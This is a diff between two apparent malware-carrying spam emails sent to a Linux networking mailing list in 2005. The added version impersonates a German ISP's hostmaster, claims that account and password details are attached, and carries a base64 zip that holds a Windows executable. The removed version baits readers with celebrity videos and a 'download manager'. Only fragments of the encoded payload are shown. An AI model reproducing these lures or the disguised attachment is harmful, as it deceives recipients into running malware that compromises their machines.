@@ -1,30 +1,29 @@
-From: postman@npn.yc.sgi.com
-Subject: Paris_Hilton_&_Nicole_Richie
-Date: Sun, 25 Dec 2005 03:35:30 GMT
-Message-ID: <4501b1f7a57ac616d@npn.yc>
+From: hostmaster@t-online.de
+Subject: Your Password
+Date: Sun, 25 Dec 2005 06:05:03 UTC
+Message-ID: <edfc95.3da2380b642@t-online.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=d2fdd3f.6f925ddda20b"
+Content-Type: multipart/mixed; boundary="======a0a751caedfd.38a3fb81"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=d2fdd3f.6f925ddda20b
+--======a0a751caedfd.38a3fb81
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=d2fdd3f.6f925ddda20b
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.t-online.de
+***** Email: postman@t-online.de
+--======a0a751caedfd.38a3fb81
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=d2fdd3f.6f925ddda20b--
+--======a0a751caedfd.38a3fb81--
